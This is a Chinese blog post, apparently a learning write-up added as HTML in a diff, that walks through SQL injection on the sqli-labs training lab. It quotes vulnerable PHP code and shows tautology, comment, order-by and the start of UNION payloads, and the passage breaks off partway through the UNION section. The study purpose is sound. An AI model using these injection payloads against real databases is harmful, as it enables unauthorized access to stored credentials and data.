@@ -1,0 +1,1182 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Sqli Labs - ReaL One</title><meta name="author" content="RockBear">
+<meta name="author-link" content="">
+<meta name="description" content="真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入" /><meta name="keywords" content='SQL_INJECTION' /><meta itemprop="name" content="Sqli Labs">
+<meta itemprop="description" content="真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入"><meta itemprop="datePublished" content="2023-12-07T11:19:19+08:00" />
+<meta itemprop="dateModified" content="2023-12-07T11:19:19+08:00" />
+<meta itemprop="wordCount" content="1454">
+<meta itemprop="keywords" content="SQL_INJECTION," /><meta property="og:title" content="Sqli Labs" />
+<meta property="og:description" content="真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://66lueflam144.github.io/posts/aa470b6/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-07T11:19:19+08:00" />
+<meta property="article:modified_time" content="2023-12-07T11:19:19+08:00" />
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Sqli Labs"/>
+<meta name="twitter:description" content="真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入"/>
+<meta name="application-name" content="R1">
+<meta name="apple-mobile-web-app-title" content="R1"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://66lueflam144.github.io/posts/aa470b6/" /><link rel="prev" href="https://66lueflam144.github.io/posts/8f09e57/" /><link rel="next" href="https://66lueflam144.github.io/posts/9095c52/" /><link rel="stylesheet" href="/css/style.min.b2891ee1b6ff200dd9ad67722bcb1f78551624c44cb60d45d5412d56f6f2a15fc8e68c34e781b6dbfa2e6f2a8a2aedee47d747583374da085e667e9d0ef85620.css" integrity="sha512-soke4bb/IA3ZrWdyK8sfeFUWJMRMtg1F1UEtVvbyoV/I5ow054G22/oubyqKKu3uR9dHWDN02gheZn6dDvhWIA=="><link rel="preload" href="/lib/fontawesome-free/all.min.cf780ba5def29277f562835b0b3a9129ce2aca8afc81a294d6a9a7f824a1c5bb81bac00d23d42946884606b7821642b12e17a2e92f424171446db2aea8b8340c.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.cf780ba5def29277f562835b0b3a9129ce2aca8afc81a294d6a9a7f824a1c5bb81bac00d23d42946884606b7821642b12e17a2e92f424171446db2aea8b8340c.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="></noscript><link rel="preload" href="/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css" integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw==" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css" integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw=="></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Sqli Labs",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/66lueflam144.github.io\/posts\/aa470b6\/"
+    },"genre": "posts","keywords": "SQL_INJECTION","wordcount":  1454 ,
+    "url": "https:\/\/66lueflam144.github.io\/posts\/aa470b6\/","datePublished": "2023-12-07T11:19:19+08:00","dateModified": "2023-12-07T11:19:19+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="ReaL One"><img loading="lazy" src="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" alt="ReaL One" data-title="ReaL One" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">ReaL x 8 x One </span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="ReaL One"><img loading="lazy" src="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" alt="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" data-title="https://cdn-icons-png.flaticon.com/512/11737/11737763.png" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-text">ReaL x 8 x One </span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>Sqli Labs</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/learn/" class="post-category" title="Category - LEARN"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> LEARN</a></span></div><div class="post-meta-line"><span title="published on 2023-12-07 11:19:19"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-07">2023-12-07</time></span>&nbsp;<span title="1454 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#heading">'</a></li>
+    <li><a href="#or">or</a></li>
+    <li><a href="#注释">注释</a></li>
+    <li><a href="#and">AND</a></li>
+    <li><a href="#order-by">order by</a></li>
+    <li><a href="#联合查询">联合查询</a>
+      <ul>
+        <li><a href="#1">1</a></li>
+        <li><a href="#2">2</a></li>
+      </ul>
+    </li>
+    <li><a href="#group_concat">Group_concat</a>
+      <ul>
+        <li><a href="#一个位置问题">一个位置问题</a></li>
+        <li><a href="#多输出">多输出？</a></li>
+        <li><a href="#shoot">shoot</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#报错注入">报错注入</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#时间盲注">时间盲注</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>真的久远又模糊……说是sqli lab其实是重新整理和学习SQL注入</p>
+<h1 id="less-1" class="heading-element">
+  <a href="#less-1" class="heading-mark"></a>Less-1</h1><p>结合着源码看</p>
+<h2 id="heading" class="heading-element">
+  <a href="#heading" class="heading-mark"></a>'</h2><p><code>$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code></p>
+<ul>
+<li>当注入<code>id=1'</code>时，得到</li>
+</ul>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对照着翻译一下，</p>
+<p>SELECT * FROM users WHERE id =&lsquo;1&rsquo;&rsquo; LIMIT 0,1</p>
+<p>那个报错信息是&rsquo;error message&rsquo;，所以可能会误以为是<code>''1''</code>。</p>
+<p>而当<code>id=1&quot;</code>时，</p>
+<p>SELECT * FROM users WHERE id = &lsquo;1&quot;&rsquo; LIMIT 0,1</p>
+<p>双引号被看作是id的值的一部分，并不会截断原语句，所以就正常输出dumb。</p>
+<h2 id="or" class="heading-element">
+  <a href="#or" class="heading-mark"></a>or</h2><ul>
+<li>当<code>id=1' or '1' = '1</code>的时候</li>
+</ul>
+<p>SELECT * FROM users WHERE id = &lsquo;1&rsquo; or &lsquo;1&rsquo; = &lsquo;1&rsquo;</p>
+<p>因为 or之前的语句 正确，被理解为查询 id = 1，而后面的语句也判断为正确，所以整个payload被认为 正确，这会返回所有的用户信息</p>
+<p><code>id = 2' or '1' = '1</code>的时候返回的是用户的 id=1 的信息，这和上面没有解释的 返回所有用户信息 有关。</p>
+<p>拿之前那个数据库的user表来举例：</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/sql1.png" alt="../post_pre/pics/SQLi-labs/sql1.png" srcset="../post_pre/pics/SQLi-labs/sql1.png?size=small, ../post_pre/pics/SQLi-labs/sql1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/sql1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/sql1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>需要注意的是这里的 payload版本是 id = 1&rsquo; or &lsquo;1&rsquo;=&lsquo;1</p>
+<p><code>LIMIT 0, 1</code>表示只返回查找到的第一个用户信息，这也是为什么两个payload都只出现了 id = 1 的用户的信息。</p>
+<h2 id="注释" class="heading-element">
+  <a href="#%e6%b3%a8%e9%87%8a" class="heading-mark"></a>注释</h2><p>再来说注释</p>
+<p>举例,想通过注释把后面的LIMIT进行注释掉</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/sql2.png" alt="../post_pre/pics/SQLi-labs/sql2.png" srcset="../post_pre/pics/SQLi-labs/sql2.png?size=small, ../post_pre/pics/SQLi-labs/sql2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/sql2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/sql2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+当然这个是MySQL workbench里面进行的查询，</p>
+<p>可以构造一个类似的payload <code>id = 1' or '1' = '1' --+</code>，不过使用之后得到的SQL语句是</p>
+<p><code>SELECT * FROM user WHERE id='1' or '1' = '1' -- ' LIMIT 0,1</code>并返回 id=1的记录</p>
+<p>其实在这里注释符号起效了，但是在原代码里面还有另一个限制条件</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Your Login name:&#39;</span><span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Your Password:&#39;</span> <span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>mysqli_fetch_array 用于从结果集中获取一行作为关联数组，而在这段代码中只调用了一次，因此只获取了结果集的第一行。</p>
+</blockquote>
+<p>在这种双重限制之下，即使绕过了 LIMIT 的限制，也还有第二重 限制 。</p>
+<hr>
+<p>我们换一个代码进行测试</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// 获取结果集中的行数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$numRows</span> <span class="o">=</span> <span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$numRows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// 遍历结果集中的每一行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">// 遍历当前行的每一列
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$column</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="nv">$column</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;未找到匹配的记录&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;查询失败: &#34;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行注入攻击则会返回所有记录。</p>
+<p><font size =2>追寻短短几行字中的原理的过程得让人用一生去治愈……</font></p>
+<hr>
+<hr>
+<h2 id="and" class="heading-element">
+  <a href="#and" class="heading-mark"></a>AND</h2><p>把 <code>or</code>换成<code>and</code></p>
+<p>就拿最近的这个 <code>id = 1' or '1' = '1' --+</code> 举例</p>
+<p><code>id = 1' and '1' = '1' --+</code></p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sql thing: SELECT * FROM user WHERE id=&#39;1&#39; and &#39;1&#39; = &#39;1&#39; -- &#39; LIMIT 0,1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Your name is: John&lt;br&gt;your psw: daidgiaegigak</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我的理解：</p>
+<ul>
+<li>
+<p><strong>or条件下</strong>，字符'1&rsquo;等于‘1’为真——<code>making the entire condition true for every row</code>，id=1，id=2无所谓，执行语句的只是看true or not，true就返回，而这个做到为每一个记录发放 true 通行证，所以返回了所有记录。</p>
+</li>
+<li>
+<p>而<strong>and条件下</strong>，<code>Since '1'='1' is always true, the condition simplifies to id = '1', and it checks whether the id is equal to the string '1'.</code>也是'1&rsquo;=&lsquo;1&rsquo;永远为 true ， 这个条件语句就会被简化成 id = 1&rsquo; （可以理解为为 true 简写），但执行者只看见 id = 1‘ 并且在该语句中为 true ，所以就只返回了id = 1的记录</p>
+</li>
+</ul>
+<hr>
+<h2 id="order-by" class="heading-element">
+  <a href="#order-by" class="heading-mark"></a>order by</h2><p>正常的order by 用法：</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/order3.png" alt="../post_pre/pics/SQLi-labs/order3.png" srcset="../post_pre/pics/SQLi-labs/order3.png?size=small, ../post_pre/pics/SQLi-labs/order3.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/order3.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/order3.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>而在SQL注入中用的是：</p>
+<p><code>SELECT * FROM user WHERE id='1' order by 4 -- ；</code></p>
+<p>payload就是 <code>id = 1' order by 4 --+</code></p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/order1.png" alt="../post_pre/pics/SQLi-labs/order1.png" srcset="../post_pre/pics/SQLi-labs/order1.png?size=small, ../post_pre/pics/SQLi-labs/order1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/order1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/order1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>当修改 order by后面的数字为5的时候：</p>
+<p>Error Code: 1054. Unknown column &lsquo;5&rsquo; in &lsquo;order clause&rsquo;</p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/order2.png" alt="../post_pre/pics/SQLi-labs/order2.png" srcset="../post_pre/pics/SQLi-labs/order2.png?size=small, ../post_pre/pics/SQLi-labs/order2.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/order2.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/order2.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以由这种对比中看出这个 order by 究竟在 by 个什么——<strong>columns</strong>。</p>
+<p>这个测试表里面有 4 个columns：</p>
+<ul>
+<li>
+<p>username</p>
+</li>
+<li>
+<p>email</p>
+</li>
+<li>
+<p>password</p>
+</li>
+<li>
+<p>id</p>
+</li>
+</ul>
+<p>超出column数的时候就会报错，而没有超过都会正常回显，借此可以知道有几列(column)</p>
+<blockquote>
+<p>当你指定ORDER BY 4，数据库会尝试按照第4列的值对结果进行排序。如果user表有至少4列，这个查询就会成功执行并返回结果。但是，如果user表少于4列，数据库就无法找到第4列，这个查询就会失败，并返回一个错误，通常是“Unknown column ‘4’ in ‘order clause’”。</p>
+</blockquote>
+<hr>
+<h2 id="联合查询" class="heading-element">
+  <a href="#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" class="heading-mark"></a>联合查询</h2><h3 id="1" class="heading-element">
+  <a href="#1" class="heading-mark"></a>1</h3><p><code>SELECT * FROM user where id = '-1' union select 1,2,3,4-- '</code></p>
+<p><img loading="lazy" src="../post_pre/pics/SQLi-labs/union1.png" alt="../post_pre/pics/SQLi-labs/union1.png" srcset="../post_pre/pics/SQLi-labs/union1.png?size=small, ../post_pre/pics/SQLi-labs/union1.png?size=medium 1.5x, ../post_pre/pics/SQLi-labs/union1.png?size=large 2x" data-title="../post_pre/pics/SQLi-labs/union1.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<blockquote>
+<p>SELECT * FROM user where id = &lsquo;-1&rsquo; union select 1,2,3,4&ndash; &lsquo;的含义是，先从user表中选择那些id等于-1的行，然后将结果与select 1,2,3,4的结果合并。</p>
+</blockquote>
+<p>UNION操作符用于合并两个或多个SELECT语句的结果集。在这个查询中，union select 1,2,3,4会创建一个临时的结果集，其中包含一行，这一行的值分别是1,2,3,4。</p>
+<p>id = -1 这一行其实不存在，如果使用了存在的id进行 union：</p>
